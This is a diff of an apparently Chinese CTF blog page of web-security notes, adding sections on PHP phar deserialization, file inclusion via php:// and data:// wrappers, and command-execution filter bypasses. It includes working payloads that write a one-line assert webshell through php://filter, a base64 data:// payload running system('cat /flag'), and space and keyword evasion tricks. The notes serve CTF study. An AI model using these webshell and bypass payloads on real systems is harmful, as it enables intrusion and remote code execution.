+<li><code>phar</code>是php中类似jar包一样的一种打包方式，phar文件上传绕过的本质就是phar反序列化  <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/LLdo7obJCs-J_Ek1lFxD7g">https://mp.weixin.qq.com/s/LLdo7obJCs-J_Ek1lFxD7g</a></li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);   <span class="comment">//删除之前的test.par文件(如果有)</span></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);  <span class="comment">//创建一个phar对象，文件名必须以phar为后缀</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();  <span class="comment">//开始写文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);  <span class="comment">//写入stub</span></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//写入meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);  <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
 <h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><ul>
 <li>php 的特性，当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 __weakup ();  PHP5 &lt; 5.6.25、PHP7 &lt; 7.0.10</li>
 <li>如果 PHP 代码使用了 <code>__autoload()</code> 或 <code>spl_autoload_register()</code>，那么在 <code>unserialize()</code> 时，PHP 会尝试自动加载不存在的类。攻击者可能通过控制 <code>autoload</code> 机制，使其加载恶意代码。  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PERL"><figure class="iseeu highlight /perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   spl_autoload_register(function(<span class="variable">$class</span>) &#123;</span><br><span class="line">    include <span class="string">&quot;/tmp/<span class="variable">$class</span>.php&quot;</span>; <span class="regexp">//</span> 如果 <span class="class"><span class="keyword">class</span> 不存在，会自动尝试加载</span></span><br><span class="line"><span class="class">&#125;)</span>;</span><br><span class="line"></span><br><span class="line">unserialize(<span class="string">&#x27;O:8:&quot;Malicious&quot;:0:&#123;&#125;&#x27;</span>); <span class="regexp">//</span>假设类 Malicious 不存在，PHP 会通过已注册的自动加载函数尝试加载 /tmp/Malicious.php 文件</span><br></pre></td></tr></table></figure></div></li>
@@ -572,6 +646,71 @@
 <ul>
 <li>Apache&#x2F;Nginx错误配置<br>Windows IIS&#x2F;Apache 目录穿越 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/21516413">https://zhuanlan.zhihu.com/p/21516413</a><br>Nginx配置安全 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html">https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html</a></li>
 </ul>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><ul>
+<li><p>四种常见的文件包含函数<br>include():找不到被包含的文件只会产生警告，脚本继续执行<br>require():找不到被包含的文件会产生致命错误，并停止脚本运行<br>include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含<br>require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</p>
+</li>
+<li><p>php伪协议：</p>
+  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PERL"><figure class="iseeu highlight /perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>）file:<span class="regexp">//</span> 访问本地文件系统</span><br><span class="line"><span class="number">2</span>）http:<span class="regexp">//</span> 访问 HTTP (S) 网址</span><br><span class="line"><span class="number">3</span>）ftp:<span class="regexp">//</span> 访问 FTP (S) URL</span><br><span class="line"><span class="number">4</span>) php:<span class="regexp">//</span> 访问各个输出输入流  在CTF中经常使用的是php:<span class="regexp">//</span>filter和php:<span class="regexp">//inpu</span>t,php:<span class="regexp">//</span>filter用于读取源码。php:<span class="regexp">//inpu</span>t用于执行php代码</span><br><span class="line"><span class="number">5</span>) zlib:<span class="regexp">//</span> 处理压缩流</span><br><span class="line"><span class="number">6</span>) data:<span class="regexp">//</span> 读取数据   和php:<span class="regexp">//inpu</span>t的区别是data伪协议直接执行内容</span><br><span class="line"><span class="number">7</span>) <span class="keyword">glob</span>:<span class="regexp">//</span> 查找匹配的文件路径模式</span><br><span class="line"><span class="number">8</span>) phar:<span class="regexp">//</span> PHP 归档</span><br><span class="line"><span class="number">9</span>) rar:<span class="regexp">//</span> RAR 数据压缩</span><br></pre></td></tr></table></figure></div>
+<p>用data伪协议也可以读文件data:&#x2F;&#x2F;text&#x2F;plain;base64,<code>[base64]</code></p>
+</li>
+<li><p><code>file_get_contents()</code> 是 PHP 读取文件内容的函数，它可以：</p>
+</li>
+</ul>
+<p>&emsp;读取本地文件 (<code>file://</code>)<br>&emsp;读取远程文件 (<code>http://</code> &#x2F; <code>https://</code>)<br>&emsp;读取特殊流 (<code>php://input</code>, <code>data://</code> 等)<br>&emsp;读取压缩文件 (<code>compress.zlib://</code>)</p>
+<ul>
+<li><mark><code>enctype=&quot;multipart/form-data&quot;</code> 的时候 <code>php://input</code> 是无效的</marked> 这是一个文件上传的请求 它需要进行特殊的、更复杂的处理</li>
+<li>phpfilter写入一句话木马：</li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">GET提交</span><br><span class="line">?<span class="attribute">file</span>=php://filter/wirte=convert.base64-decode/resource=2.php</span><br><span class="line">POST提交</span><br><span class="line"><span class="attribute">content</span>=PD9waHAgYXNzZXJ0KCRfUE9TVFt4XSk7Pz4=</span><br></pre></td></tr></table></figure></div>
+<p>content提交的值是经过base64编码后的一句话木马<code>&lt;?php assert($_POST[x]);?&gt;</code></p>
+<ul>
+<li>绕过死亡代： <code>file_put_contents($file,&quot;&lt;?php die();?&gt;&quot;.$content);</code> 这里要用到一个过滤器<code>string.rot13</code> 也就是凯撒13，这样子可以不出现php</li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">GET提交</span><br><span class="line">/?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="keyword">string</span>.rot13/resource=<span class="number">3.</span>php</span><br><span class="line">POST提交</span><br><span class="line">content=<span class="meta">&lt;?</span>cuc nffreg(<span class="variable">$_CBFG</span>[k]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>data伪协议有检测的时候，可以尝试<code>data:,</code> 这种极端的简写形式  data协议的完整格式是<code>data:[&lt;mediatype&gt;][;base64],&lt;data&gt;</code><br>如果有检测php等关键字，可以使用base64选项<code>data:;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==</code></li>
+<li>php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接 临时文件包含知识点： <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ZgI8q_0FoXVSPIt01tN0YQ">https://mp.weixin.qq.com/s/ZgI8q_0FoXVSPIt01tN0YQ</a></li>
+</ul>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><ul>
+<li>exec默认没有回显,需要手动加上echo.而且只会回显出一行结果,因此常用第二个数组参数接收多行结果.</li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:<span class="variable">$arr</span>=[]; <span class="built_in">echo</span> <span class="built_in">exec</span>(ipconfig,<span class="variable">$arr</span>); var_dump(<span class="variable">$arr</span>);</span><br></pre></td></tr></table></figure></div>
+<p>shell_exec 默认没有回显,需要手动加上echo,可以输出多行结果.</p>
+<ul>
+<li><code>pcntl_exec</code> PHP &gt; 4.2.0 <code>&lt;?php pcntl_exec ( &quot;/bin/bash&quot; , array(&quot;whoami&quot;)); ?&gt;</code></li>
+<li>其他可以看文件内容的命令<table>
+<thead>
+<tr>
+<th align="left"><code>cat</code></th>
+<th align="left"><code>tac</code></th>
+<th align="left"><code>more</code></th>
+<th align="left"><code>less</code></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>od</code></td>
+<td align="left"><code>xxd</code></td>
+<td align="left"><code>tail</code></td>
+<td align="left"><code>nl</code></td>
+</tr>
+<tr>
+<td align="left"><code>sort</code></td>
+<td align="left"><code>grep</code></td>
+<td align="left"><code>uniq</code></td>
+<td align="left"><code>file -f</code></td>
+</tr>
+</tbody></table>
+</li>
+<li>利用反引号和base64能绕过很多过滤</li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`<span class="built_in">echo</span> bHMK | <span class="built_in">base64</span> -d`  `<span class="built_in">echo</span> L2Jpbgo= | <span class="built_in">base64</span> -d`</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>shell中可以设置变量</li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=fla;d=g.php;<span class="variable">$a</span><span class="variable">$b</span> <span class="variable">$&#123;c&#125;</span><span class="variable">$&#123;d&#125;</span></span><br><span class="line"><span class="comment">#等效于 cat flag.php</span></span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>过滤空格常见姿势<br>读文件用&lt;&gt; 代替  ${IFS}代替空格  控制字符代替空格<code>%09 %0b %0c</code>  字符串截断代替空格(在env可以找到一些有空格的变量)<br><code>cmd=tac$&#123;PHP_EXTRA_CONFIGURE_ARGS:12:1&#125;fl*</code></li>
+</ul>
 
     </div>
 
@@ -674,7 +813,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#http"><span class="nav-text">http</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#md5"><span class="nav-text">md5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E7%9F%A5%E8%AF%86"><span class="nav-text">php知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ctf%E4%B8%AD%E7%9A%84linux"><span class="nav-text">ctf中的linux</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-text">文件上传</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssrf"><span class="nav-text">ssrf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%86%E8%8A%82"><span class="nav-text">细节</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E8%AF%AD%E8%A8%80%E7%9F%A5%E8%AF%86"><span class="nav-text">其他语言知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F"><span class="nav-text">信息泄漏</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#http"><span class="nav-text">http</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#md5"><span class="nav-text">md5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E7%9F%A5%E8%AF%86"><span class="nav-text">php知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ctf%E4%B8%AD%E7%9A%84linux"><span class="nav-text">ctf中的linux</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-text">文件上传</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssrf"><span class="nav-text">ssrf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%86%E8%8A%82"><span class="nav-text">细节</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E8%AF%AD%E8%A8%80%E7%9F%A5%E8%AF%86"><span class="nav-text">其他语言知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F"><span class="nav-text">信息泄漏</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-text">文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE"><span class="nav-text">RCE</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -690,7 +829,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">76</span>
+          <span class="site-state-item-count">77</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -726,6 +865,9 @@
     </div>
     <ul class="links-of-recent-posts-list">
         <li class="links-of-recent-posts-item">
+          <a href="/posts/6341.html" title="posts&#x2F;6341.html">xyctf2025部分复盘</a>
+        </li>
+        <li class="links-of-recent-posts-item">
           <a href="/posts/14848.html" title="posts&#x2F;14848.html">群友靶机-Kakeru2 wp</a>
         </li>
         <li class="links-of-recent-posts-item">
@@ -736,9 +878,6 @@
         </li>
         <li class="links-of-recent-posts-item">
           <a href="/posts/28847.html" title="posts&#x2F;28847.html">群友靶机-Noport复盘</a>
-        </li>
-        <li class="links-of-recent-posts-item">
-          <a href="/posts/7589.html" title="posts&#x2F;7589.html">SQL注入专题(更新中)</a>
         </li>
     </ul>
   </div>
